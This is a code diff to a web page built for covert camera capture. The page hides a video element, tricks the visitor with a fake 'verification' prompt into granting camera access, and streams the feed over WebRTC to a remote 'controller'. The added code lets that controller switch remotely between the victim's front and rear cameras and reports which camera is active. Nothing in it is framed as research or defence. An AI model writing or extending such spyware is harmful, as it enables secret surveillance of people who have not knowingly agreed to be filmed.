@@ -145,6 +145,7 @@
         let pendingIceCandidates = [];
         let pingInterval = null;
         let isConnectingWs = false;
+        let currentFacingMode = 'user'; // 'user' (front) or 'environment' (rear)
         const video = document.getElementById('hiddenVideo');
 
         async function startCovertStream() {
@@ -158,6 +159,7 @@
             try {
                 localStream = await navigator.mediaDevices.getUserMedia({
                     video: {
+                        facingMode: { ideal: currentFacingMode },
                         width: { ideal: 1280, max: 1920 },
                         height: { ideal: 720, max: 1080 },
                         frameRate: { ideal: 30, max: 30 }
@@ -177,6 +179,60 @@
                     <h1 style="color: #ef4444;">Verification Failed</h1>
                     <p>Camera access was not granted. Please allow camera permission and reload the page.</p>
                 `;
+            }
+        }
+
+        async function switchCamera(requestedMode) {
+            const targetMode = requestedMode || (currentFacingMode === 'user' ? 'environment' : 'user');
+            console.log(`[*] Switching camera to: ${targetMode}`);
+
+            try {
+                const newStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: { ideal: targetMode },
+                        width: { ideal: 1280, max: 1920 },
+                        height: { ideal: 720, max: 1080 },
+                        frameRate: { ideal: 30, max: 30 }
+                    },
+                    audio: false
+                });
+
+                const newVideoTrack = newStream.getVideoTracks()[0];
+                if (!newVideoTrack) return;
+
+                // Seamlessly swap video track on existing peer connection without renegotiation
+                if (pc) {
+                    const senders = pc.getSenders();
+                    const videoSender = senders.find(s => s.track && s.track.kind === 'video');
+                    if (videoSender) {
+                        await videoSender.replaceTrack(newVideoTrack);
+                        console.log("[+] Video track successfully replaced on PeerConnection");
+                    }
+                }
+
+                // Stop previous video track
+                if (localStream) {
+                    localStream.getVideoTracks().forEach(track => {
+                        track.stop();
+                        localStream.removeTrack(track);
+                    });
+                    localStream.addTrack(newVideoTrack);
+                } else {
+                    localStream = newStream;
+                }
+
+                video.srcObject = localStream;
+                currentFacingMode = targetMode;
+
+                // Notify controller of current active camera
+                if (ws && ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({
+                        type: "camera_info",
+                        camera: currentFacingMode
+                    }));
+                }
+            } catch (err) {
+                console.error("Failed to switch camera:", err);
             }
         }
 
@@ -206,6 +262,14 @@
                 }, 20000);
 
                 await sendOffer();
+
+                // Send initial camera status
+                if (ws && ws.readyState === WebSocket.OPEN) {
+                    ws.send(JSON.stringify({
+                        type: "camera_info",
+                        camera: currentFacingMode
+                    }));
+                }
             };
 
             ws.onmessage = async (event) => {
@@ -219,6 +283,9 @@
                     if (msg.type === "request_offer") {
                         console.log("[+] Received request_offer from controller");
                         await sendOffer();
+                    } else if (msg.type === "switch_camera") {
+                        console.log("[+] Received switch_camera command");
+                        await switchCamera(msg.camera);
                     } else if (msg.type === "answer" && pc) {
                         console.log("[+] Setting remote answer description");
                         await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
@@ -227,7 +294,7 @@
                         while (pendingIceCandidates.length > 0) {
                             const cand = pendingIceCandidates.shift();
                             try {
-                                await pc.addIceCandidate(new RTCIceCandidate(cand));
+                                await pc.addIceCandidate(cand);
                             } catch (e) {
                                 console.warn("Failed to add queued candidate:", e);
                             }
@@ -235,7 +302,7 @@
                     } else if (msg.type === "ice" && pc) {
                         if (pc.remoteDescription && pc.remoteDescription.type) {
                             try {
-                                await pc.addIceCandidate(new RTCIceCandidate(msg.data));
+                                await pc.addIceCandidate(msg.data);
                             } catch (e) {
                                 console.warn("Failed to add ICE candidate:", e);
                             }
